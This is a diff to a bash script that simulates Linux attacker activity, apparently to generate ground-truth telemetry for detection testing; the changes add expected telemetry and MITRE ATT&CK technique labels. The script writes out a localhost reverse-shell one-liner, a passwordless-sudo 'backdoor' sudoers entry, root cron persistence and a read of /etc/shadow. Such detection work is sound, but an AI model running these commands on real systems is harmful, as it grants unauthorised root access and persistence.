@@ -2,40 +2,39 @@
 # name: 11-linux_attack_sim.sh
 # purpose: Controlled Linux attacker simulation
 # author: analyst
-
-set -e
-
-OUTPUT_FILE="$(dirname "$0")/linux_attack_log.json"
+set -euo pipefail
+OUTPUT_FILE="$(dirname "$0")/linuxattacklog.json"
 TEST_USER="testattacker"
 SUDOERS_FILE="/etc/sudoers.d/backdoor"
 SUSPICIOUS_BIN="/tmp/suspicious_bin"
 CRON_FILE="/etc/cron.d/persistence_test"
 BEACON_FILE="/tmp/beacon.sh"
-
 ACTIONS="[]"
 COUNT=0
-
 get_timestamp() {
     date -u +"%Y-%m-%dT%H:%M:%SZ"
 }
-
 add_action() {
     COUNT=$((COUNT + 1))
-    ACTION_NUMBER="$1"
-    DESCRIPTION="$2"
-    TIMESTAMP="$3"
-
+    local NUMBER="$1"
+    local DESCRIPTION="$2"
+    local TIMESTAMP="$3"
+    local TELEMETRY="$4"
+    local MITRE="$5"
     ACTIONS=$(printf '%s' "$ACTIONS" | jq \
-        --argjson number "$ACTION_NUMBER" \
+        --argjson number "$NUMBER" \
         --arg description "$DESCRIPTION" \
         --arg timestamp "$TIMESTAMP" \
+        --arg telemetry "$TELEMETRY" \
+        --arg mitre "$MITRE" \
         '. + [{
             action_number: $number,
             description: $description,
-            timestamp: $timestamp
+            timestamp: $timestamp,
+            expected_telemetry: $telemetry,
+            mitre_attack_technique: $mitre
         }]')
 }
-
 cleanup() {
     echo "[*] Cleaning up artifacts..."
     userdel "$TEST_USER" 2>/dev/null || true
@@ -47,39 +46,49 @@ cleanup() {
     echo "    [CLEAN]"
 }
 trap cleanup EXIT
-
 echo "[*] Running Linux attacker simulation..."
-
 echo -n "    [1/6] Creating user testattacker..."
 userdel "$TEST_USER" 2>/dev/null || true
 useradd "$TEST_USER"
 TS=$(get_timestamp)
-add_action 1 "Create user testattacker" "$TS"
+add_action 1 \
+    "Create user testattacker" \
+    "$TS" \
+    "auditd; useradd; account management" \
+    "T1136.001 - Create Account: Local Account"
 echo " $TS"
-
 echo -n "    [2/6] Modifying sudoers..."
 echo "testattacker ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE"
 chmod 440 "$SUDOERS_FILE"
 TS=$(get_timestamp)
-add_action 2 "Modify sudoers" "$TS"
+add_action 2 \
+    "Modify sudoers" \
+    "$TS" \
+    "auditd; sudoers file modification" \
+    "T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching"
 echo " $TS"
-
 echo -n "    [3/6] Executing from /tmp..."
 cp /usr/bin/id "$SUSPICIOUS_BIN"
 chmod +x "$SUSPICIOUS_BIN"
 "$SUSPICIOUS_BIN" >/dev/null
 TS=$(get_timestamp)
-add_action 3 "Execute binary from /tmp" "$TS"
+add_action 3 \
+    "Execute binary from /tmp" \
+    "$TS" \
+    "auditd; execve; file access" \
+    "T1059.004 - Command and Scripting Interpreter: Unix Shell"
 echo " $TS"
-
 echo -n "    [4/6] Reverse shell attempt (localhost)..."
 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null || true
 sleep 1
 kill %1 2>/dev/null || true
 TS=$(get_timestamp)
-add_action 4 "Attempt reverse shell to localhost" "$TS"
+add_action 4 \
+    "Attempt reverse shell to localhost" \
+    "$TS" \
+    "auditd; network connection" \
+    "T1059.004 - Command and Scripting Interpreter: Unix Shell"
 echo " $TS"
-
 echo -n "    [5/6] Cron persistence..."
 echo '#!/bin/bash' > "$BEACON_FILE"
 echo "echo controlled-simulation >/dev/null" >> "$BEACON_FILE"
@@ -87,15 +96,21 @@ chmod +x "$BEACON_FILE"
 echo "* * * * * root /tmp/beacon.sh" > "$CRON_FILE"
 chmod 644 "$CRON_FILE"
 TS=$(get_timestamp)
-add_action 5 "Modify crontab" "$TS"
+add_action 5 \
+    "Modify crontab" \
+    "$TS" \
+    "auditd; cron file modification" \
+    "T1053.003 - Scheduled Task/Job: Cron"
 echo " $TS"
-
 echo -n "    [6/6] Accessing /etc/shadow..."
 cat /etc/shadow > /dev/null
 TS=$(get_timestamp)
-add_action 6 "Access sensitive file /etc/shadow" "$TS"
+add_action 6 \
+    "Access sensitive file /etc/shadow" \
+    "$TS" \
+    "auditd; /etc/shadow access" \
+    "T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow"
 echo " $TS"
-
 jq -n \
     --arg timestamp_format "UTC ISO 8601" \
     --argjson actions "$ACTIONS" \
@@ -106,6 +121,5 @@ jq -n \
         actions_executed: $count,
         actions: $actions
     }' > "$OUTPUT_FILE"
-
 echo "Actions executed: $COUNT"
 echo "Ground truth saved to: $OUTPUT_FILE"
